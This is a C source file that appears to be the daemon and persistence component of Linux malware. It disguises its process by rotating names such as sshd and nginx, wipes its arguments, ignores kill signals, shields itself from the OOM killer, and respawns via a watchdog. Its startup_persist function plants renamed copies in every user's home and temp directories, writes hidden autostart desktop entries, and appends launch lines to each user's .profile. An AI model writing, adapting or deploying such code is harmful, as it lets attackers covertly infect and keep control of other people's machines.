#define _GNU_SOURCE

#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <pwd.h>
#include <grp.h>
#include "headers/daemon.h"

static int is_root() {
    return getuid() == 0;
}

static const char* get_random_name(void) {
    static const char *names[] = {
        "update", "cache", "cron", "logs",
        "backup", "sync", "monitor", "db",
        "net", "service", "daemon", "worker"
    };
    static const size_t names_count = sizeof(names) / sizeof(names[0]);
    return names[rand() % names_count];
}

static int safe_strncpy(char *dest, const char *src, size_t size) {
    if (!dest || !src || size == 0) return -1;
    size_t len = strlen(src);
    if (len >= size - 1) return -1;
    memmove(dest, src, len);
    dest[len] = '\0';
    return 0;
}

static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
    if (!dest || !dir || !file || dest_size == 0) return -1;
    size_t dir_len = strlen(dir);
    size_t file_len = strlen(file);
    size_t req_len = dir_len + file_len + 2; // +1 for '/' and +1 for '\0'
    if (req_len > dest_size) return -1;
    //fix buffer overflow 1
    memcpy(dest, dir, dir_len);
    dest[dir_len] = '/';
    //overflow 2
    //snprintf->memcpy
    memcpy(dest + dir_len + 1, file, file_len);
    dest[req_len - 1] = '\0';
    return 0;
}

static const char *process_names[] = {
    "cache", "sshd", "bash", "crond",
    "nginx", "postgres", "apache", "mysql",
    "python", "node", "redis", "memcached"
};
static const size_t process_names_count = sizeof(process_names) / sizeof(process_names[0]);

static void protect_process() {
    struct rlimit limit = {0};
    limit.rlim_cur = limit.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_AS, &limit);
    setrlimit(RLIMIT_MEMLOCK, &limit);
    setrlimit(RLIMIT_NPROC, &limit);
    setrlimit(RLIMIT_NOFILE, &limit);
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_NAME, (unsigned long)get_random_name());
    prctl(PR_SET_CHILD_SUBREAPER, 1);
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    int fd = open("/proc/self/oom_score_adj", O_WRONLY);
    if(fd >= 0) {if(write(fd,"-1000\n",6) != 6) goto done; done: close(fd);}
    setpriority(PRIO_PROCESS, 0, -20);
    struct sigaction sa = {0};
    sa.sa_handler = SIG_IGN;
    sigfillset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART|SA_NOCLDWAIT;
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGQUIT, &sa, NULL);
    sigaction(SIGPIPE, &sa, NULL);
    sigaction(SIGUSR1, &sa, NULL);
    sigaction(SIGUSR2, &sa, NULL);
    sigaction(SIGCHLD, &sa, NULL);
}

void* rename_process(void* arg) {
    static unsigned int last_name_index = 0;
    while (1) {
        unsigned int name_index = (rand() % process_names_count);
        if (name_index == last_name_index) {
            name_index = (name_index + 1) % process_names_count;
        }
        const char* new_name = process_names[name_index];
        char* env_ptr = (char*)getenv("_");
        if (env_ptr) {
            size_t env_size = strlen(env_ptr);
            safe_strncpy(env_ptr, new_name, env_size + 1);
            prctl(PR_SET_NAME, new_name);
        }
        last_name_index = name_index;
        sleep(8);
    }
    return NULL;
}

int copy_file(const char *src, const char *dst) {
    char buf[1024];
    size_t size;

    FILE* source = fopen(src, "rb");
    if (!source) {
        return -1;
    }

    FILE* dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return -1;
    }

    while ((size = fread(buf, 1, 1024, source)) > 0) {
        fwrite(buf, 1, size, dest);
    }

    fclose(source);
    fclose(dest);

    return chmod(dst, S_IRWXU | S_IRWXG | S_IRWXO);
}

void run_clone(const char *path, int argc, char** argv) {
    if (!path || !argv) {
        return;
    }
    
    pid_t pid = fork();
    if (pid == -1) {
        return;
    }
    if (pid == 0) {
        overwrite_argv(argc, argv);
        execl(path, path, (char *)NULL);
        _exit(EXIT_SUCCESS);
    }
}

void handle_watchdog_error() {
    pid_t pid = fork();
    if (pid == -1) {
        return;
    }
    if (pid == 0) {
        execl("/proc/self/exe", "init", NULL);
        _exit(1);
    }
}

void* watchdog(void* arg) {
    time_t last = time(NULL);
    char path[PATH_MAX], exe[PATH_MAX];
    pid_t pid = getpid();
    if (readlink("/proc/self/exe", exe, sizeof(exe)-1) < 0) return NULL;
    
    while (1) {
        FILE* f = fopen("/proc/self/status", "r");
        if (f) {
            char* line = NULL;
            size_t len = 0;
            while (getline(&line, &len, f) != -1) {
                if (strstr(line, "VmRSS:")) {
                    long rss = 0;
                    if (sscanf(line, "VmRSS: %ld", &rss) == 1 && rss > 250000) {
                        pid_t child = fork();
                        if (child == 0) {execl(exe, "init", NULL); _exit(1);}
                    }
                    break;
                }
            }
            free(line);
            fclose(f);
        }
        if (time(NULL) - last > 300) {
            pid_t child = fork();
            if (child == 0) {execl(exe, "init", NULL); _exit(1);}
            last = time(NULL);
        }
        sleep(30);
    }
    return NULL;
}

int startup_persist(const char *source_path) { //2
    if (!source_path) return -1;

    static const char *home_dirs[] = {
        "/home",
        "/root",
        "/var/home",
        "/var/lib",
        "/var/run"
    };
    
    static const char *startup_locations[] = {
        "/.config/autostart",
        "/.local/bin",
        "/.cache",
        "/tmp"
    };
    
    static const int home_dirs_count = sizeof(home_dirs) / sizeof(home_dirs[0]);
    static const int startup_locations_count = sizeof(startup_locations) / sizeof(startup_locations[0]);
    
    char temp_path[PATH_MAX] = {0};
    static const char *autostart_str = "autostart";

    for (int i = 0; i < home_dirs_count; i++) {
        DIR *dir = opendir(home_dirs[i]);
        if (!dir) continue;
        
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type != DT_DIR || entry->d_name[0] == '.') continue;
            
            for (int j = 0; j < startup_locations_count; j++) {
                char dest_dir[PATH_MAX] = {0};
                unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
                
                if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) != 0) continue;
                if (join_path(dest_dir, sizeof(dest_dir), temp_path, startup_locations[j] + 1) != 0) continue;
                
                if (mkdir(dest_dir, 0755) != 0 && errno != EEXIST) continue;
                
                char dest_path[PATH_MAX] = {0};
                const char* name = get_random_name();
                size_t remaining = sizeof(dest_path);
                size_t written = snprintf(dest_path, remaining, "%s/%s_%x", dest_dir, name, rand_val);
                if (written >= remaining) continue;
                
                if (access(dest_path, F_OK) == 0) continue;
                
                if (copy_file(source_path, dest_path) == 0) {
                    if (strstr(dest_dir, autostart_str)) {
                        char desktop_path[PATH_MAX] = {0};
                        if (join_path(desktop_path, sizeof(desktop_path), dest_dir, "updater.desktop") == 0) {
                            FILE *f = fopen(desktop_path, "w");
                            if (f) {
                                fprintf(f, "[Desktop Entry]\nType=Application\nName=%s\nExec=%s\nHidden=true\nX-GNOME-Autostart-enabled=true\n", 
                                    name, dest_path);
                                fclose(f);
                                chmod(desktop_path, 0644);
                            }
                        }
                    }
                    
                    chmod(dest_path, S_IRUSR | S_IWUSR | S_IXUSR);
                    
                    char profile_path[PATH_MAX] = {0};
                    if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) == 0 &&
                        join_path(profile_path, sizeof(profile_path), temp_path, ".profile") == 0) {
                        
                        int entry_exists = 0;
                        FILE *check = fopen(profile_path, "r");
                        if (check) {
                            char line[PATH_MAX];
                            while (fgets(line, sizeof(line), check)) {
                                if (strcmp(line, dest_path) == 0) {
                                    entry_exists = 1;
                                    break;
                                }
                            }
                            fclose(check);
                        }

                        if (!entry_exists) {
                            FILE *profile = fopen(profile_path, "a");
                            if (profile) {
                                fprintf(profile, "\n(nohup %s >/dev/null 2>&1 &)\n", dest_path);
                                fclose(profile);
                            }
                        }
                    }
                }
            }
        }
        closedir(dir);
    }
    return 0;
}

void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) {
        signal(sig, signal_handler);
        return;
    }
}

void setup_signal_handlers() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    
    if (sigaction(SIGPIPE, &sa, NULL) != 0) return;
    if (sigaction(SIGHUP, &sa, NULL) != 0) return;
    
    sa.sa_handler = signal_handler;
    if (sigaction(SIGTERM, &sa, NULL) != 0) return;
    if (sigaction(SIGINT, &sa, NULL) != 0) return;
    
    sa.sa_handler = SIG_IGN;
    if (sigaction(SIGALRM, &sa, NULL) != 0) return;
    if (sigaction(SIGUSR1, &sa, NULL) != 0) return;
    if (sigaction(SIGUSR2, &sa, NULL) != 0) return;
}

void daemonize(int argc, char** argv) {
    pid_t pid = fork();
    if(pid < 0) return;
    if(pid > 0) return;
    if(setsid() < 0) return;
    pid = fork();
    if(pid < 0) return;
    if(pid > 0) return;
    if(chdir("/") != 0) return;
    umask(0);
    struct rlimit rlim;
    if(!getrlimit(RLIMIT_NOFILE,&rlim))
        for(int i=0;i<rlim.rlim_max;i++) close(i);
    int fd = open("/dev/null",O_RDWR);
    if(fd >= 0) {
        dup2(fd,0);dup2(fd,1);dup2(fd,2);
        if(fd>2)close(fd);
    }
    protect_process();
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
    pthread_t watcher;
    pthread_create(&watcher,&attr,watchdog,NULL);
    pthread_attr_destroy(&attr);
    srand(time(NULL)^(getpid()<<16));
}

void overwrite_argv(int argc, char** argv) {
    if (!argv || argc <= 0) return;
    for (int i = 0; i < argc && argv[i]; i++) {
        size_t len = strlen(argv[i]);
        if (len > 0) explicit_bzero(argv[i], len);
    }
    if (argv[0] && strlen(argv[0]) >= 4) memcpy(argv[0], "init", 4);
}
